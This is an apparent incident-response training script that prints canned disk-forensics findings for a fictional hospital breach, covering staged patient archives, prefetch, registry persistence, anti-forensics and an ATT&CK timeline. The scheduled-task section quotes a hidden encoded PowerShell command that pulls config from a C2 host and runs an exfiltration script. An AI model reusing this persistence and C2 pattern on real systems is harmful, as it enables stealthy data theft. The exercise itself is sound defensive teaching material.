#!/bin/bash
#
# 4x05 - Attack Reconstruction
# Task 2 - Disk Forensics Analysis
#
# Parses the WS-RECV-03 disk-forensics report and extracts evidence
# relevant to persistence, execution, staging and anti-forensics.
#

set -euo pipefail

DISK="ir_evidence/disk_forensics_report.txt"
TOPOLOGY="reference/network_topology.txt"

for file in "$DISK" "$TOPOLOGY"; do
    if [[ ! -f "$file" ]]; then
        echo "ERROR: Required file not found: $file" >&2
        exit 1
    fi
done

for cmd in grep sort uniq wc; do
    if ! command -v "$cmd" >/dev/null 2>&1; then
        echo "ERROR: Required command not found: $cmd" >&2
        exit 1
    fi
done

has_evidence() {
    grep -Fqi -- "$1" "$DISK"
}

echo "================================================================"
echo "   DISK FORENSICS ANALYSIS - WS-RECV-03"
echo "   Source: $DISK"
echo "================================================================"
echo

echo "EVIDENCE CONTEXT:"
echo "  Host:          WS-RECV-03"
echo "  IP:            10.10.3.21"
echo "  Disk image:    Internal NVMe / NTFS C:"
echo "  Acquired:      2026-05-15 19:45 CDT"
echo "  Image format:  E01"
echo "  Evidence type: Primary disk forensic evidence"
echo

echo "================================================================"
echo "RECOVERED DELETED FILES"
echo "================================================================"
echo

if has_evidence "staging_export_001.zip"; then
cat <<'EOF'
[D1] staging_export_001.zip
  Original path:
    C:\Users\Public\Tmp\staging_export_001.zip

  Status:
    DELETED - successfully recovered

  Recovery:
    Cluster carving + $MFT residue

  Size:
    14,219,484 bytes (~14.2 MB)

  Created:
    2026-05-08 02:36:08 CDT

  Last access:
    2026-05-08 02:38:11 CDT

  Deleted:
    2026-05-08 02:38:14 CDT

  Recovered content:
    out_20260508023559.csv

  CSV fields:
    patient_id
    first_name
    last_name
    dob
    ssn
    diagnosis_codes

  Records:
    47,138 patient records

  Assessment:
    Full patient-table data was collected from SRV-HEALTH-DB and
    compressed locally on WS-RECV-03.

  ATT&CK:
    T1005      Data from Local System
    T1074.001  Local Data Staging
    T1560.001  Archive Collected Data

  Confidence:
    CONFIRMED - recovered archive contains the collected records.
EOF
fi

echo

if has_evidence "staging_export_002.zip"; then
cat <<'EOF'
[D2] staging_export_002.zip
  Original path:
    C:\Users\Public\Tmp\staging_export_002.zip

  Status:
    DELETED - successfully recovered

  Recovery:
    Cluster carving + $MFT residue

  Size:
    11,802,944 bytes (~11.8 MB)

  Created:
    2026-05-11 03:14:42 CDT

  Deleted:
    2026-05-11 03:17:01 CDT

  Recovered content:
    out_20260511031408.csv

  Content:
    Insurance-policy/member data including identity fields.

  Source:
    SRV-INS-DB

  Assessment:
    Collection and staging were not limited to the health-records
    database. Insurance data from the second lateral target was
    also staged.

  ATT&CK:
    T1005      Data from Local System
    T1074.001  Local Data Staging
    T1560.001  Archive Collected Data

  Confidence:
    CONFIRMED - recovered archive contains collected database data.
EOF
fi

echo

if has_evidence "query_results.csv"; then
cat <<'EOF'
[D3] query_results.csv
  Original path:
    C:\Users\Public\Tmp\query_results.csv

  Status:
    DELETED - successfully recovered

  Size:
    8,419,232 bytes (~8.4 MB)

  Created:
    2026-05-13 02:31:18 CDT

  Deleted:
    2026-05-13 02:34:05 CDT

  Content:
    Active Directory enumeration export

  Fields include:
    sAMAccountName
    displayName
    memberOf
    lastLogon
    servicePrincipalName
    description

  Rows:
    1,184

  Assessment:
    Full AD user/service-account reconnaissance was performed after
    the attacker reached SRV-DC-01.

  ATT&CK:
    T1087.002  Account Discovery: Domain Account

  Confidence:
    CONFIRMED
EOF
fi

echo

if has_evidence "out.dat"; then
cat <<'EOF'
[D4] out.dat
  Original path:
    C:\Windows\Temp\out.dat

  Status:
    DELETED - partially recovered

  Recovered:
    ~11 MB of ~23 MB original

  Content indicators:
    Mimikatz-format dump structures
    OffsetToCryptoBlob markers
    UTF-16 credential strings
    "svc_healthsync" appears in recovered data

  Assessment:
    This identifies svc_healthsync as credential material present
    in the LSASS dump and strongly connects credential access with
    the later service-account abuse.

  ATT&CK:
    T1003.001  OS Credential Dumping: LSASS Memory

  Confidence:
    CONFIRMED when correlated with memory/Sysmon LSASS evidence.
EOF
fi

echo

if has_evidence "hb_cfg.json"; then
cat <<'EOF'
[D5] hb_cfg.json
  Original path:
    C:\Users\records03\AppData\Local\Temp\hb_cfg.json

  Status:
    DELETED - recovered

  Created:
    2026-05-15 02:00:13 CDT

  Deleted:
    2026-05-15 02:00:48 CDT

  Relevant configuration:
    sql_host:       SRV-HEALTH-DB
    sql_port:       1433
    sql_db:         health_records
    clear_logs:     true
    channel:        c2_post
    stage_dir:      C:\Users\Public\Tmp\

  Assessment:
    Configuration directly links the exfiltration script to the
    database, local staging directory and log-clearing behavior.
EOF
fi

echo
echo "================================================================"
echo "DATA STAGING ASSESSMENT"
echo "================================================================"
echo

cat <<'EOF'
Staging directory:
  C:\Users\Public\Tmp\

Observed sequence:

  Database query
       |
       v
  CSV result
       |
       v
  ZIP archive
       |
       v
  Local staging directory
       |
       v
  File read / access
       |
       v
  File deletion

Evidence:
  staging_export_001.zip -> 47,138 patient records
  staging_export_002.zip -> insurance/member records
  query_results.csv      -> 1,184 AD account records

ATT&CK:
  T1005      Data from Local System
  T1074.001  Local Data Staging
  T1560.001  Archive Collected Data
  T1070.004  File Deletion

Assessment:
  Data collection and local staging are CONFIRMED.

IMPORTANT:
  Disk evidence alone does NOT prove that the staged archives were
  successfully transmitted outside MedDefense.

  Exfiltration must be established independently using firewall /
  network evidence.
EOF

echo
echo "================================================================"
echo "PREFETCH ANALYSIS"
echo "================================================================"
echo

cat <<'EOF'
Program                 Last Execution          Runs   Expected on WS-RECV-03?
----------------------  ----------------------  -----  -----------------------
svchost_update.exe      2026-05-15 13:02:14     142   NO - malicious RAT
powershell.exe          2026-05-15 02:00:14      18   PARTIAL
PsExec64.exe            2026-05-13 02:08:56       3   NO
wmic.exe                2026-05-13 02:11:11       5   SUSPICIOUS in context
wsmprovhost.exe         2026-05-13 02:12:02       4   SUSPICIOUS in context
debug_tool.exe          2026-05-12 02:45:01       2   NO
schtasks.exe            2026-05-07 01:47:33       1   SUSPICIOUS in context
EOF

echo
echo "PREFETCH EXECUTION DETAILS:"
echo

cat <<'EOF'
  PsExec64.exe:
    2026-05-06 02:11:42 -> SRV-HEALTH-DB
    2026-05-09 02:46:11 -> SRV-INS-DB
    2026-05-13 02:08:56 -> SRV-DC-01

    Assessment:
      PsExec is not expected administrative activity from the
      records-department workstation WS-RECV-03.

      Prefetch independently corroborates the 4x04 PsExec hunt.

  debug_tool.exe:
    2026-05-05 03:22:14 -> credential dump #1
    2026-05-12 02:45:01 -> credential dump #2

    Assessment:
      Execution history corroborates the LSASS-access evidence.

  wmic.exe:
    Five attacker-relevant executions.

    Assessment:
      Matches anomalous WMI activity identified during 4x04.

  PowerShell:
    18 total executions represented by the relevant prefetch entry.
    The report states that the last eight executions correspond to
    the daily 02:00 scheduled-task window.

    IMPORTANT:
      PowerShell itself is not automatically malicious. Some
      legitimate records03 PowerShell use exists. Context, parent
      process, command line and execution time are required.

  schtasks.exe:
    2026-05-07 01:47:33

    Assessment:
      Corroborates creation of "HealthSync Update Service".
EOF

echo
echo "================================================================"
echo "SCHEDULED TASK PERSISTENCE"
echo "================================================================"
echo

if has_evidence "HealthSync Update Service"; then
cat <<'EOF'
Task:
  \HealthSync Update Service

On-disk artifact:
  C:\Windows\System32\Tasks\HealthSync Update Service

Registration:
  2026-05-07T01:47:33.4528916

Author:
  MEDDEFENSE\records03

Trigger:
  Daily

StartBoundary:
  2026-05-07T02:00:00

Hidden:
  true

Run level:
  HighestAvailable

Action:
  %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe

Arguments:
  -NoP -W Hidden -EncodedCommand <base64>

Decoded command:
  $cfg = 'http://sync.healthbane-c2.net/api/v1/cfg';
  & $env:TEMP\sync_healthdata.ps1 -Config $cfg

ATT&CK:
  T1053.005 Scheduled Task/Job: Scheduled Task

CORRELATION WITH TASK 1:
  Memory:
    TaskCache registry entry identified the task.

  Disk:
    Full task XML exists under Windows\System32\Tasks.

  Prefetch:
    schtasks.exe execution at the registration timestamp.

  PowerShell Prefetch:
    Daily 02:00 execution pattern.

Confidence:
  CONFIRMED - convergent evidence from independent memory and
  disk artifacts.
EOF
fi

echo
echo "================================================================"
echo "REGISTRY PERSISTENCE / DEFENSE EVASION"
echo "================================================================"
echo

cat <<'EOF'
[R1] Registry Run key

  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\HealthSync

  Value:
    %APPDATA%\Microsoft\HealthSync\svchost_update.exe

  Last write:
    2026-04-22 06:14:47 UTC

  ATT&CK:
    T1547.001 Registry Run Keys / Startup Folder

  Assessment:
    Existing HEALTHBANE RAT persistence mechanism.
    Disk evidence corroborates the memory finding.

[R2] Scheduled Task

  HealthSync Update Service

  ATT&CK:
    T1053.005 Scheduled Task/Job

[R3] Windows Defender exclusion

  HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths

  Value:
    C:\Windows\Temp

  Last write:
    2026-05-04 18:11:08 CDT

  ATT&CK:
    T1562.001 Impair Defenses

  Assessment:
    The exclusion predates the first debug_tool.exe credential dump
    and allowed attacker tooling placed in Windows\Temp to avoid
    normal Defender inspection.

[R4] System time configuration

  W32Time TimeAdjustmentDisabled = 0

  Assessment:
    Windows time synchronization was not disabled.
    No evidence of system clock manipulation was identified.
EOF

echo
echo "================================================================"
echo "NTFS / $MFT ATTACK TIMELINE"
echo "================================================================"
echo

cat <<'EOF'
2026-05-04 18:11
  Defender exclusion added for C:\Windows\Temp
  ATT&CK: T1562.001

2026-05-05 03:22
  debug_tool.exe executed
  First credential dump
  ATT&CK: T1003.001

2026-05-06 02:11
  PsExec64.exe execution
  Target: SRV-HEALTH-DB
  ATT&CK: T1021.002

2026-05-07 01:47
  HealthSync Update Service registered
  ATT&CK: T1053.005

2026-05-08 02:36
  staging_export_001.zip created
  Contains 47,138 patient records
  ATT&CK: T1074.001 / T1560.001

2026-05-08 02:38
  staging_export_001.zip accessed and deleted
  ATT&CK: T1070.004

2026-05-09 02:46
  PsExec64.exe execution
  Target: SRV-INS-DB
  ATT&CK: T1021.002

2026-05-09 03:01
  Security.evtx deleted/recreated
  ATT&CK: T1070.001

2026-05-11 03:14
  staging_export_002.zip created
  Insurance/member data staged
  ATT&CK: T1074.001 / T1560.001

2026-05-11 03:17
  staging archive and source CSV deleted
  ATT&CK: T1070.004

2026-05-12 02:45
  debug_tool.exe executed
  Second credential dump
  ATT&CK: T1003.001

2026-05-13 02:08
  PsExec64.exe execution
  Target: SRV-DC-01
  ATT&CK: T1021.002

2026-05-13 02:31
  query_results.csv created
  Full AD account enumeration export
  ATT&CK: T1087.002

2026-05-13 02:34
  query_results.csv deleted
  ATT&CK: T1070.004

2026-05-15 02:00
  hb_cfg.json / exfiltrator execution artifacts
  ATT&CK: T1059.001 / T1005
EOF

echo
echo "================================================================"
echo "ANTI-FORENSICS INDICATORS"
echo "================================================================"
echo

cat <<'EOF'
[OBSERVED]

  T1070.001 - Clear Windows Event Logs

    Security.evtx deleted/recreated:
      2026-05-09 03:01:42 CDT

    First event in recreated log:
      2026-05-09 03:12:02 CDT

    Gap:
      approximately 12 minutes

    Correlation:
      Recovered exfiltrator configuration contains:
        clear_logs:true

    Confidence:
      CONFIRMED

  T1070.004 - File Deletion

    Attacker-created files D1-D5 were deleted after use.

    Examples:
      staging_export_001.zip
      staging_export_002.zip
      query_results.csv
      out.dat
      hb_cfg.json

    Confidence:
      CONFIRMED

  T1562.001 - Impair Defenses

    Defender exclusion:
      C:\Windows\Temp

    Added:
      2026-05-04 18:11:08 CDT

    Confidence:
      CONFIRMED


[NOT OBSERVED]

  Volume Shadow Copy deletion:
    NOT observed

  USN journal deletion:
    NOT observed

  Prefetch deletion:
    NOT observed

  $MFT manipulation:
    NOT observed

  Timestamp manipulation:
    No evidence identified.
    W32Time remained normally configured.
EOF

echo
echo "================================================================"
echo "DISK FORENSICS ASSESSMENT"
echo "================================================================"
echo

cat <<'EOF'
CONFIRMED:
  - HEALTHBANE persistence existed through both a Run key and a
    hidden scheduled task.
  - PsExec, WMI and credential-dumping tools executed on WS-RECV-03.
  - The attacker collected and locally staged database data.
  - 47,138 patient records were present in a recovered archive.
  - Insurance/member data from SRV-INS-DB was also staged.
  - Active Directory account information was collected.
  - svc_healthsync credential material appeared in the recovered
    LSASS dump.
  - Attacker-created staging artifacts were deliberately deleted.
  - Windows Security logging was cleared/recreated during the attack.
  - A Defender exclusion was added before credential dumping.

IMPORTANT LIMITATION:
  Disk evidence confirms collection, compression and staging.

  It does NOT, by itself, prove that the staged patient or insurance
  data crossed the MedDefense network boundary.

  Firewall/network evidence must determine whether exfiltration
  actually completed.

NEW / UPGRADED ATT&CK EVIDENCE:
  T1053.005  Scheduled Task/Job
  T1562.001  Impair Defenses
  T1070.001  Clear Windows Event Logs
  T1070.004  File Deletion
  T1074.001  Local Data Staging
  T1560.001  Archive Collected Data
  T1005      Data from Local System

OVERALL CONFIDENCE:
  HIGH / CONFIRMED for persistence, collection, staging and
  anti-forensics based on primary disk artifacts and correlation
  with memory / previous hunt findings.
EOF

echo
echo "================================================================"
echo "   Disk analysis complete."
echo "================================================================"